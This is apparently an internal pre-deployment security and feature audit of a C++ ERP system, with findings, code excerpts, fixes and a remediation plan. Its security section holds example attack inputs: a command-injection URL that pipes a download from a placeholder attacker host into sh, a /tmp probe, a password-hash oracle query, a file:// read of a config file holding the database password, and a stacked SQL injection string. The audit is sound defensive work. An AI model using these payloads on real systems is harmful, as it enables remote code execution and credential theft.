# 038 — Security & Feature Audit, Pre-Deployment Plan

**Date:** 2026-08-02
**Baseline:** HEAD `0c798e5`
**Supersedes:** `037-deployment-readiness-plan.md` (Track A — packaging/TLS sections no longer apply)
**Target:** GCP VM, Ubuntu 24.04, behind nginx (nginx terminates TLS and owns all inbound); app and PostgreSQL bind loopback only
**Status:** Proposed — for review

---

## 0. Scope

Codebase only. Infrastructure, TLS, certificates, firewall and nginx config are out of scope
and assumed handled. What *is* in scope is **application code that behaves differently, or
incorrectly, because it sits behind a reverse proxy** — §2 S-40 is exactly that, and it is
the finding most specific to your topology.

This audit is independent of reviews v1–v10. Findings below were reached by reading the
source, not by re-reading `review/`. Six are new.

**A note on the target OS:** you described the VM as "Ubuntu 24.04, bookworm". Those are two
different systems — `bookworm` is Debian 12; Ubuntu 24.04 is `noble`. It matters here, see
§2 S-46.

---

## 1. Findings summary

| # | Finding | Severity | Confidence |
|---|---|---|---|
| **S-39** | Command injection via PDF temp-file path → RCE (2 sinks) | **HIGH** | Code-confirmed, exploit unverified |
| **S-40** | Rate limiters keyed on peer IP — collapse to `127.0.0.1` behind nginx | **HIGH** | Confirmed |
| **S-41** | Domain field names not checked against FieldRegistry → password-hash oracle | **MEDIUM** | Confirmed |
| **S-42** | Session ID not rotated on login (session fixation) | **MEDIUM** | Confirmed |
| **S-43** | `evictExpired()` never called + session created per anon request → memory DoS | **MEDIUM** | Confirmed |
| **S-44** | `--enable-local-file-access` on both wkhtmltopdf calls → local file read into PDF | **LOW–MED** | Confirmed |
| **S-45** | `BaseModel::validateOrder_` insufficient alone (latent, not currently reachable) | **LOW** | Confirmed |
| **S-46** | `install_wkhtml.sh` has no `noble` branch — silently installs the jammy build | **MEDIUM (avail.)** | Confirmed in script |
| **S-47** | Identity/privilege changes unaudited — `res.users`, `res.groups` + 6 more custom ViewModels | **HIGH** | Confirmed — see `039` §2a |
| S-31 | Portal hardcoded reset password `"Welcome1"` | LOW | Carried from v10 |

Carried from v10: S-38 (CSV routes now build a `UserContext`) is **verified fixed** in
`d087308`.

**S-37 is *not* fully fixed** — corrected in `039` §2a. `d087308` fixed the five modules v10
named (account, sale, stock, purchase, mrp — 36 call sites), but v10 scoped the finding to
those five and never enumerated the ViewModel registry. Eight further custom ViewModels with
mutating handlers still do not audit, including `res.users` and `res.groups`. Tracked as
**S-47**; add to Stage 1.

---

## 2. Security findings — detail

### S-39 — Command injection in PDF generation → RCE (HIGH)

**Sinks:**
- `modules/report/ReportModule.cpp:1309` → `:1442`
- `modules/portal/PortalModule.cpp:2174` → `:338`

Both build a temp path by concatenating URL-derived strings, then pass it to `std::system()`:

```cpp
// ReportModule.cpp:1309  — route "/report/pdf/{1}/{2}", BOTH segments attacker-controlled
std::string tmpBase = "/tmp/erp_report_" + model + "_" + idStr;
...
// :1442
+ " \"" + tmpHtml + "\"" + " \"" + tmpPdf + "\"" + " 2>/dev/null";
int ret = std::system(cmd.c_str());
```

The id guard does not constrain the string that reaches the shell:

```cpp
try { recordId = std::stoi(idStr); } catch (...) { /* reject */ }
```

`std::stoi("12$(id)")` returns `12` and **does not throw** — it parses a leading integer and
discards the remainder. `recordId` is used for the DB lookup; the raw `idStr` is what goes
into the path. In `sh`, `$(...)` **is** expanded inside double quotes.

**Attack:** `GET /report/pdf/sale.order/12$(curl${IFS}attacker/x|sh)` — the record lookup
succeeds on id 12, the command substitution executes as the server user. wkhtmltopdf then
fails and returns 503, so the response looks like a routine error.

- ReportModule route requires an authenticated internal user (`checkAuth`).
- **PortalModule route requires only a portal customer login** — a much lower bar, and the
  portal is the public-facing surface. `model` there is a hardcoded literal, but `idStr` is
  not.

Ten reviews missed this because S-29 (v7) closed the *paper format* interpolation and the
path was treated as settled. The paper-format allowlist is correct and intact
(`ReportModule.cpp:1424`, `PortalModule.cpp:2161`) — this is a different parameter.

**Fix (~3 h):**
1. Build the path from the parsed integer, never the raw segment: `std::to_string(recordId)`.
2. Replace `std::system()` with `fork()` + `execv()` and an argv array — no shell, no quoting
   to get wrong. This closes the whole class permanently.
3. Use `mkstemp()` for the temp files (also fixes the predictable-path symlink issue: today
   `/tmp/erp_report_sale.order_12.html` is deterministic and world-writable-directory, so any
   local process can pre-plant a symlink and have the server write through it).

**Verify before and after** — two minutes:
```bash
curl -b "$COOKIE" 'http://127.0.0.1:8069/report/pdf/sale.order/1$(touch%20/tmp/pwned)'
ls /tmp/pwned   # exists  => vulnerable
```
Exploitability depends on Drogon's `{1}` path-parameter charset; run the check rather than
assuming either way.

---

### S-40 — Rate limiters see only the proxy IP (HIGH — specific to your topology)

**Sites:** `JsonRpcDispatcher.hpp:264`, `:313`, `PortalModule.cpp:1301`

```cpp
const std::string ip = req->getPeerAddr().toIp();
```

No site consults `X-Forwarded-For` or `X-Real-IP`. Once nginx fronts the app, **every request
arrives from `127.0.0.1`**, so `LoginRateLimiter`'s per-IP table collapses to a single global
bucket. Two consequences, both bad:

1. **Unauthenticated lockout DoS.** `kMaxAttempts = 10` per 5-minute window — now *global*.
   Ten bad logins from one attacker lock out **every user** of the backoffice, and separately
   **every customer** of the portal, for 5 minutes. Sustained, it is a permanent outage of
   both login endpoints, from a single unauthenticated client.
2. **Brute-force protection inverted.** `recordSuccess(ip)` calls `table_.erase(ip)` — on the
   shared bucket. An attacker holding *any* valid low-privilege credential interleaves a
   successful login every ~9 attempts, resetting the global counter, and brute-forces
   indefinitely at full speed.

This is latent today (direct access = real peer IPs) and activates the moment you put nginx
in front. It should be fixed in the same change that introduces the proxy.

**Fix (~4 h):**
- Add `trusted_proxies` to `system.cfg` (default `127.0.0.1,::1`).
- Helper `clientIp(req)`: if the peer is a trusted proxy, take the **last** entry of
  `X-Forwarded-For` (last hop = the one your nginx appended; earlier entries are
  client-spoofable). Otherwise use the peer address.
- Use it at all three sites.
- Pair with `real_ip_header X-Forwarded-For;` + `set_real_ip_from` in nginx.
- Consider per-account failure counters alongside per-IP, so one IP cannot lock out others.

---

### S-41 — Domain field names bypass the FieldRegistry → password-hash oracle (MEDIUM)

`Domain::sanitizeColumn_` (`modules/base/Domain.hpp:203`) validates the **charset** only:

```cpp
for (char c : field)
    if (!std::isalnum(c) && c != '_')
        throw std::runtime_error("Domain: invalid field name '" + field + "'");
return field;
```

It never asks whether the column is a registered, exposed field. So a domain can filter on
any column present in the table but deliberately hidden from the API.

`res_users.password` is exactly such a column — it exists (`AuthModule.cpp:358`) and is
intentionally kept out of the registry so it can never be SELECTed
(`AuthViewModel.hpp:226`: *"password is intentionally excluded from ResUsers fieldRegistry_"*).
That defense is bypassed on the domain path:

```json
{"model":"res.users","method":"search_read",
 "args":[[["password","like","$pbkdf2-sha512$600000$AA%"]]],"kwargs":{"fields":["id"]}}
```

Row count reveals whether the prefix matched → the full stored hash is extractable character
by character. `res.users` is readable by any authenticated internal user
(`JsonRpcDispatcher.hpp:562`).

Severity is held to MEDIUM because the hash is PBKDF2-SHA512 at 600 000 rounds — offline
cracking is expensive. But the same oracle works on **any** unregistered column in **any**
table, so the impact is not limited to this one field.

**Fix (~4 h):** thread the model's `FieldRegistry` into `domainFromJson()` / `toSql()` and
reject columns that are not registered. `mergeRuleDomain_` must be exempt — rule domains are
server-authored and legitimately reference internal columns.

---

### S-42 — Session ID not rotated on authentication (MEDIUM)

`JsonRpcDispatcher.hpp:325` promotes the *existing* session in place on successful login:

```cpp
const std::string cookieSid = result.value("session_id", sid);
const bool updated = sessions_->update(cookieSid, [&result](Session& s) { ... });
```

The anonymous session ID the browser already held becomes the authenticated one. Two things
make this reachable rather than theoretical:

- `handleGetSessionInfo_` returns `session_id` in the JSON body (`Session::toJson`,
  `SessionManager.hpp:73`) — one unauthenticated GET yields a valid pre-auth SID.
- `resolveSessionId_` (`:487`) accepts a session id from the **request body**
  (`kwargs.context.session_id`), not just the cookie.

Attacker obtains SID → gets the victim to adopt it (cookie injection from any sibling host on
the parent domain, or a crafted link in a cookie-less client) → victim authenticates → the
attacker's SID is now authenticated. Full account takeover, no credential theft.

**Fix (~2 h):** on successful `authenticate`, `create()` a fresh session, copy the
authenticated fields into it, `destroy()` the old id, and set the new id in the cookie. This
is the standard fixation defense and is cheap here because `SessionManager` already supports
both operations.

---

### S-43 — Unbounded session accumulation → memory-exhaustion DoS (MEDIUM)

Two facts combine:

1. `SessionManager::evictExpired()` (`SessionManager.hpp:200`) is **never called** — searched
   `core/`, `modules/`, `main.cpp`; the only hits are its own definition and two comments.
   `get()` returns `nullopt` for an expired session but **leaves the entry in `store_`**.
2. `resolveSessionId_` step 3 (`JsonRpcDispatcher.hpp:504`) calls `sessions_->create()` —
   which inserts into `store_` — for **every request without a valid cookie**, and it runs
   *before* the auth check (`:271`).

So any unauthenticated client can allocate a permanent `Session` (several strings + a json
object + a vector) per HTTP request, and nothing ever reclaims them. A modest request flood
grows the process until the OOM killer fires. There is no rate limit on `call_kw` — only on
`authenticate`.

**Fix (~3 h):**
- Register a Drogon interval timer calling `evictExpired()` every 60 s. *(This is also the
  natural home for other periodic work later — see `ir.cron`, §3.)*
- Do not persist a session until it is authenticated; hand anonymous callers a transient
  `Session{}` instead of a stored one.
- Cap `store_` size and reject new anonymous sessions past the cap.

---

### S-44 — `--enable-local-file-access` on both wkhtmltopdf invocations (LOW–MEDIUM)

`ReportModule.cpp:1438`, `PortalModule.cpp:333`. Any HTML that reaches the renderer can pull
local files into the output PDF:

```html
<img src="file:///home/user/code/c-erp/config/system.cfg">
```

`config/system.cfg` contains `db_password`. The rendered HTML comes from DLE document
templates, which are admin-editable — so this is an admin → server-file-read path, and it
becomes far worse if template editing is ever delegated to a lower-privileged role.

**Fix (~1 h):** drop the flag. If the logo genuinely needs local file access, keep it but
confine the process (`--allow <dir>` only, or a dedicated non-readable-elsewhere user).

---

### S-45 — `validateOrder_` is insufficient on its own (LOW — latent, not reachable today)

`BaseModel::validateOrder_` (`BaseModel.hpp:395`) splits `order` on commas, checks only the
**first whitespace-delimited token** of each segment against the registry, then
`search()`/`searchRead()` concatenate the **raw original string** into the SQL
(`:246`, `:283`). So `"name DESC; DROP TABLE audit_log--"` passes validation — `name` is a
real field. And when the domain is empty, `paramVec` is empty and the code takes
`txn.exec(sql)` (`:254`, `:291`), which is `PQexec` and **does permit stacked statements**.

**Not currently exploitable:** every RPC path routes through `CallKwArgs::order()`
(`IViewModel.hpp:65`), a strict hand-written parser that accepts only
`ident [ASC|DESC] [, ...]` and rejects semicolons, quotes and parens. That parser is correct
— I checked it fully. The CSV export route passes a literal `"id ASC"`.

The problem is that safety rests entirely on *every* caller going through that one accessor,
while `search`/`searchRead` are public `IModel` virtuals. The next non-RPC caller that builds
an order string from user input reintroduces SQL injection with no warning.

**Fix (~2 h):** have `validateOrder_` **rebuild** the clause from validated tokens and use
the rebuilt string, rather than validating one string and concatenating another. Defense in
depth, cheap, permanent.

---

### S-46 — `install_wkhtml.sh` has no `noble` branch (MEDIUM, availability)

`scripts/install_wkhtml.sh:38-48` handles `jammy|bookworm` and **silently falls back to
jammy** for anything else — including `noble` (Ubuntu 24.04, your target):

```
No wkhtmltox 0.12.6.1-2 build for 'noble' — defaulting to jammy.
```

The jammy package is built against Ubuntu 22.04's library ABI. On 24.04 it will either fail
dependency resolution at `apt install` or install and fail at run time. Blast radius: every
PDF route in both ReportModule and PortalModule returns 503. Nothing else breaks, and the
failure only appears at first PDF request — not at startup.

**Fix (~2 h):** decide deliberately rather than by fallback. Either run the PDF renderer in a
jammy container, or switch to a maintained renderer (`weasyprint`, headless Chromium
`--print-to-pdf`). Note the codebase depends on wkhtmltopdf's **patched-Qt** `--footer-html`
(`ReportModule.cpp:1414` comment), which stock Chromium does not provide — the footer layout
work in `docs/030` would need redoing. Test this on the VM early; it is the kind of thing that
surfaces on demo day.

---

### Configuration issues in tracked files

`config/system.cfg` is **tracked in git** (`git ls-files config/` confirms) with
`db_password = odoo` in plaintext. For the nginx topology it also needs:

| Key | Current | Should be | Why |
|---|---|---|---|
| `http_interface` | `0.0.0.0` | `127.0.0.1` | You want the app reachable only via nginx; today it binds all interfaces, so GCP firewall is the only thing preventing direct access on :8069 |
| `secure_cookies` | *absent* → defaults `false` (`Container.hpp:466`) | `true` | nginx serves HTTPS; without this the session cookie has no `Secure` flag and will be sent over any plaintext downgrade |
| `dev_mode` | *absent* → defaults `false` | leave absent | Correct default — verified |
| `db_password` | `odoo`, in git | env var or untracked file | `AppConfig::fromFileOrEnv` already falls back to env |

`SameSite=Lax` **is** set (`JsonRpcDispatcher.hpp:348`) and `HttpOnly` **is** set (`:346`) —
both correct.

**Fix (~1 h):** commit `config/system.cfg.example`, `git rm --cached config/system.cfg`, add
it to `.gitignore`, rotate the DB password. The password is in git history — rotation is not
optional.

---

## 3. Feature audit

Carried from `037` §2, re-scoped to code. Verified absent by source search.

### 3.1 Missing framework primitives — highest leverage

| the reference ERP model | State | Blocks |
|---|---|---|
| **`ir.sequence`** | Missing. Numbering uses hardcoded raw PG sequences (`sale_order_seq`, `stock_out_seq`) created inline in `ensureSchema_()` | No prefix/padding, no per-company numbering, no yearly reset, no gapless invoice numbering — **a legal requirement in most jurisdictions** |
| **`ir.attachment`** | Missing entirely | Any file upload, PDF attachment, datasheets (PK7), document management |
| **`ir.cron`** | Missing | Reordering rules, recurring invoices, session GC (see S-43), scheduled reports |
| **`ir.mail_server`** | Missing (Phase 17f) | Portal password reset (S-31), `auth_signup` (Phase 14, documented as blocked on this), invoice emailing |
| **`ir.model.data`** | Missing — replaced by the manual ID registry in `docs/026` | No safe re-seed on upgrade; ID collisions caught by a spreadsheet, not the DB |

### 3.2 Missing business logic

| Area | State |
|---|---|
| **Tax computation** | `account.tax` model and `tax_line_id` field exist; **no engine**. No tax lines are generated. **Every invoice total is currently untaxed** |
| **`stock.quant`** | Missing. **No on-hand quantity exists anywhere** — no `qty_available`, no quant table. Stock is only derivable by ad-hoc `SUM(stock_move.quantity)`. No reservation, valuation, availability check, or inventory adjustment |
| `product.supplierinfo` | Missing — but **allowlisted** at `JsonRpcDispatcher.hpp:566`. Phase A3b, "🔜 Next" since 2026-03-24 |
| `mrp.production` | Missing — but **allowlisted** at `:607`. Only `mrp.bom` + `mrp.bom.line` exist |
| `product.template` / variants | Missing — `product.product` only |
| `product.pricelist` | Missing — price is `list_price` only |
| `account.fiscal.position` | Missing |
| `res.currency.rate` | Missing — `currency_id` stored, never converted |
| Bank reconciliation | Missing |
| `stock.production.lot` | Missing (Phase 28) |
| `stock.rule` / reordering | Missing (Phase 29) |
| `auth_totp` (2FA), password policy | Missing — no min length or complexity on any password |
| **Test suite** | **Zero test files.** The last open P0 from v10 |

The two allowlisted-but-unimplemented models are harmless today (`ModelFactory::has()` returns
false → 404) but are dead ACL entries that will silently grant access the day someone adds the
model. Strip or implement.

### 3.3 PartKeepr (`zzref3`)

Only **PK1** landed — `ProductCategoryTree`, `web/static/src/app.js:8427`. PK2–PK7 (footprints,
parameters, SI units, MPN, supplier-info extensions, min stock, attachments) have **zero source
presence**. The ✅ rows in `docs/029` were pre-existing c-erp features, not PartKeepr work.

Do not start PK2–PK7 before deploying. PK5/PK6/PK7 are cheap *after* `product.supplierinfo`
and `ir.attachment` exist and near-worthless before.

---

## 4. Plan

### Stage 1 — Security, before the VM is reachable (~3 days)

Ordered by severity. S-40 and S-39 are the two that must not ship.

| # | Item | Effort |
|---|---|---|
| 1 | **S-39** — use `recordId` not `idStr` in temp paths; `fork`+`execv` instead of `std::system`; `mkstemp()`. Both modules | 3 h |
| 2 | **S-40** — `clientIp()` helper honouring `X-Forwarded-For` from trusted proxies; apply at all 3 sites; add `trusted_proxies` to cfg | 4 h |
| 3 | **Config** — untrack `system.cfg`, add `.example`, rotate password, set `http_interface=127.0.0.1`, `secure_cookies=true` | 1 h |
| 4 | **S-42** — rotate session ID on successful authenticate | 2 h |
| 5 | **S-43** — Drogon timer calling `evictExpired()`; don't store anonymous sessions | 3 h |
| 6 | **S-41** — validate domain field names against the FieldRegistry | 4 h |
| 7 | **S-44** — drop `--enable-local-file-access` | 1 h |
| 8 | **S-45** — rebuild ORDER BY from validated tokens | 2 h |
| 9 | Strip the two dead ACL entries (`product.supplierinfo`, `mrp.production`) | 30 m |

### Stage 2 — Verify on the target VM (~1 day)

| # | Item |
|---|---|
| 10 | **S-46** — resolve wkhtmltopdf on noble. Test a PDF route on the actual VM before anything else; decide container vs. alternative renderer |
| 11 | Confirm the app is unreachable except through nginx (`ss -tlnp`, then curl the external IP on :8069) |
| 12 | Re-run the S-39 curl probe against the deployed build |
| 13 | Confirm rate limiting actually limits per client IP through nginx — 11 bad logins from host A must not lock out host B |

### Stage 3 — The last P0 (~1 week)

| # | Item |
|---|---|
| 14 | **Test suite.** Use the harness already designed in `docs/033` §3 (zero-dependency `ERP_TEST`, separate `erp_tests` target). Seed it with regression tests for **every finding in §2** — that is the highest-value first suite available, and it is concrete work rather than a blank page. Then `Domain::toSql`, `CallKwArgs::order()`, `CsvParser`, `RuleEngine`, OCC conflict, `htmlEscape` |

### Stage 4 — Correctness (~4 weeks, post- or parallel-to-deploy)

| # | Item | Effort |
|---|---|---|
| 15 | **`ir.sequence`** — replace hardcoded PG sequences | 3–4 d |
| 16 | **Tax computation engine** — tax lines on `account.move` from `account.tax`; price-included, tax groups, rounding | 2 w |
| 17 | **`stock.quant` + `qty_available`** — real on-hand, inventory adjustment, availability check | 1.5–2 w |
| 18 | `ir.mail_server` → unblocks S-31 and Phase 14 | 3–5 d |
| 19 | `ir.cron` — reuse the S-43 timer | 3–4 d |
| 20 | Password policy + `auth_totp` | 1.5 w |
| 21 | `ir.attachment` — schema already designed in `docs/030` §2.1 | 3–4 d |
| 22 | `product.supplierinfo` (Phase A3b) | 3–4 d |
| 23 | Persistent sessions (PERF-B) — Postgres-backed store | 3–5 d |

### Stage 5 — Later

`mrp.production` → reordering rules → lot/serial → pricelists → PK2–PK7 → multi-currency FX
→ bank reconciliation → analytic accounting → product variants.

### Recommended cut line

**Stages 1–3, then deploy.** ~2 weeks, no new features, and it closes both HIGH findings and
the last open P0.

Two things to decide with open eyes, because neither is a code defect:

- Deploying without **tax computation** (#16) means every invoice total is wrong. If the first
  deployment issues real invoices, this is not deferrable.
- Deploying without **`stock.quant`** (#17) means the inventory module reports no on-hand
  quantity at all. Survivable only if the first deployment is invoicing-only.

---

## 5. Cross-cutting rules

Unchanged: SEC-28, SEC-29, S-33, PERF-E, PERF-F (see `CLAUDE.md`). Three additions earned by
this audit:

| Rule | Requirement |
|---|---|
| **SEC-30** | Never pass a request-derived string into a process-execution path. Use the parsed, typed value (`int`, enum, allowlisted token). `std::stoi` succeeding does **not** mean the input was numeric. |
| **SEC-31** | No `std::system()`. Use `fork` + `execv` with an argv array. Shell quoting is not a security boundary. |
| **SEC-32** | Client IP must come from a single `clientIp(req)` helper that is proxy-aware. Never call `getPeerAddr()` directly in application code. |
| **TEST-1** | Every item in Stage 4 ships with at least one test in `tests/` in the same commit. |
